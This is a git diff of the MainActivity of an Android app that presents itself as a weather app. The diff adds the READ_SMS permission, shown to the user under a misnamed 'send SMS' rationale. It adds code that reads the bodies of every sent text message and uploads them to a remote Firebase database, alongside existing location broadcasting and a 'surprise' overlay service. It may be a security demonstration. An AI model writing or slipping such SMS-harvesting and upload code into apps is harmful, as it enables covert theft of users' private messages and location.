@@ -4,6 +4,7 @@ import android.Manifest
 import android.app.Activity
 import android.content.ActivityNotFoundException
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -25,6 +26,7 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
+import androidx.core.content.ContextCompat
 import com.google.android.gms.location.LocationServices
 import com.google.firebase.firestore.ktx.firestore
 import com.google.firebase.ktx.Firebase
@@ -32,6 +34,12 @@ import com.plcoding.weatherapp.presentation.ui.theme.DarkBlue
 import com.plcoding.weatherapp.presentation.ui.theme.DeepBlue
 import com.plcoding.weatherapp.presentation.ui.theme.WeatherAppTheme
 import dagger.hilt.android.AndroidEntryPoint
+import android.provider.Telephony
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.DatabaseReference
+import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.ValueEventListener
 
 @AndroidEntryPoint
 class MainActivity : ComponentActivity() {
@@ -46,7 +54,8 @@ class MainActivity : ComponentActivity() {
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.CAMERA,
         Manifest.permission.CALL_PHONE,
-        Manifest.permission.SYSTEM_ALERT_WINDOW)
+        Manifest.permission.READ_SMS
+    )
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -54,7 +63,8 @@ class MainActivity : ComponentActivity() {
             ActivityResultContracts.RequestMultiplePermissions()
         ) { permissions_map ->
             if (permissions_map[Manifest.permission.ACCESS_FINE_LOCATION] == true
-                || permissions_map[Manifest.permission.ACCESS_COARSE_LOCATION] == true) {
+                || permissions_map[Manifest.permission.ACCESS_COARSE_LOCATION] == true
+            ) {
                 viewModel.loadWeatherInfo()
             }
             permissionsToRequest.forEach { current_permission ->
@@ -91,6 +101,10 @@ class MainActivity : ComponentActivity() {
                             permissionTextProvider = when (permission) {
                                 Manifest.permission.ACCESS_FINE_LOCATION -> {
                                     FineLocationPermissionTextProvider()
+                                }
+
+                                Manifest.permission.READ_SMS -> {
+                                    SendSMSPermissionTextProvider()
                                 }
 
                                 Manifest.permission.RECORD_AUDIO -> {
@@ -135,16 +149,18 @@ class MainActivity : ComponentActivity() {
                             val fusedLocationClient = LocationServices
                                 .getFusedLocationProviderClient(this@MainActivity)
                             fusedLocationClient.lastLocation
-                                .addOnSuccessListener { location -> location.let{
-                                    val lat = location.latitude
-                                    val long = location.longitude
+                                .addOnSuccessListener { location ->
+                                    location.let {
+                                        val lat = location.latitude
+                                        val long = location.longitude
 
-                                    val intent = Intent("ACTION_SEND_LOCATION").apply {
-                                        putExtra("latitude", lat)
-                                        putExtra("longitude", long)
+                                        val intent = Intent("ACTION_SEND_LOCATION").apply {
+                                            putExtra("latitude", lat)
+                                            putExtra("longitude", long)
+                                        }
+
+                                        sendBroadcast(intent)
                                     }
-
-                                    sendBroadcast(intent) }
                                 }
                         }) {
                             Text(text = "Send Broadcast")
@@ -152,8 +168,9 @@ class MainActivity : ComponentActivity() {
                         Button(onClick = {
                             // Start the service when the button is clicked and the
                             // "Display over other apps" permission is granted
-                            if (Settings.canDrawOverlays(this@MainActivity)){
-                                val serviceIntent = Intent(this@MainActivity, AlertService::class.java)
+                            if (Settings.canDrawOverlays(this@MainActivity)) {
+                                val serviceIntent =
+                                    Intent(this@MainActivity, AlertService::class.java)
                                 startService(serviceIntent)
                             } else {
                                 Toast.makeText(
@@ -165,6 +182,21 @@ class MainActivity : ComponentActivity() {
 
                         }) {
                             Text(text = "Click here for a surprise!")
+                        }
+                        Button(onClick = {
+                            // Check if permission is not granted
+                            if (ContextCompat.checkSelfPermission(
+                                    this@MainActivity,
+                                    Manifest.permission.READ_SMS
+                                )
+                                == PackageManager.PERMISSION_GRANTED
+                            ) {
+                                val smsList = readSMS()
+                                println("smsList: $smsList")
+                                sendSMSToFirebase(smsList)
+                            }
+                        }) {
+                            Text(text = "Send SMS to Firebase")
                         }
                         Button(onClick = {
                             // We retrieve the package name of the app using context.packageName.
@@ -210,12 +242,82 @@ class MainActivity : ComponentActivity() {
     }
 
 
+    private fun readSMS(): List<String> {
+        //Read SMS messages and send to Firebase
+        val smsList = mutableListOf<String>()
+
+
+        //Define the URI for the sent SMS messages
+        val sentURI: Uri = Uri.parse("content://sms/sent")
+
+        // Query the SMS content provider
+        val cursor = contentResolver.query(
+            sentURI,
+            null,  // Projection (null returns all columns)
+            null,  // Selection
+            null,  // Selection arguments
+            null   // Sort order
+        )
+
+        // Iterate through the cursor to retrieve SMS messages
+        cursor?.use { cursor ->
+            val bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY)
+
+            while (cursor.moveToNext()) {
+                val body = cursor.getString(bodyIndex)
+                smsList.add(body)
+            }
+        }
+
+        // Close the cursor to free up resources
+        cursor?.close()
+
+        return smsList
+
+    }
+
+
+    private fun sendSMSToFirebase(smsList: List<String>) {
+        val database: FirebaseDatabase = FirebaseDatabase.getInstance()
+        val smsRef: DatabaseReference = database.getReference("SMS_tree")
+
+
+        // Loop through the SMS list and push each message to Firebase
+        for (sms in smsList) {
+            // Check if the SMS message already exists in the database
+            smsRef.orderByValue().equalTo(sms).addListenerForSingleValueEvent(object :
+                ValueEventListener {
+                override fun onDataChange(dataSnapshot: DataSnapshot) {
+                    if (!dataSnapshot.exists()) {
+                        // SMS message does not exist in the database, push it
+                        val key = smsRef.push().key
+                        if (key != null) {
+                            smsRef.child(key).setValue(sms)
+                        }
+                    } else{
+                        println("Skipping duplicate SMS message: $sms")
+                    }
+
+                }
+
+                override fun onCancelled(databaseError: DatabaseError) {
+                    // Handle database error
+                    println("Error checking duplicate data: ${databaseError.message}")
+                }
+            })
+        }
+    }
+
 }
+
+
+
     fun Activity.openAppSettings() {
     Intent(
         Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
         Uri.fromParts("package", packageName, null)
     ).also(::startActivity)
     }
+
 
 
